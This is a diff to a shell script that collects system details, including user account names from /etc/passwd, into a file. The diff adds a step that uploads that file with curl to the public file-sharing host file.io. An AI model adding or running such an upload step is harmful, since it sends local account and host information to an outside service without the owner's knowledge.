@@ -81,3 +81,15 @@ echo >> $FILE
 # Get users
 echo "Users: " >> $FILE
 egrep -v 'nologin$' /etc/passwd | cut -d: -f1 >> $FILE
+
+# Experimental uploading
+if [ $(command -v curl) ]; then
+    info "Uploading file"
+    curl -F "file=@$FILE" https://file.io
+    echo
+else
+    fail "Was not able to upload the file"
+    exit
+fi
+pass "Done"
+echo >> $FILE
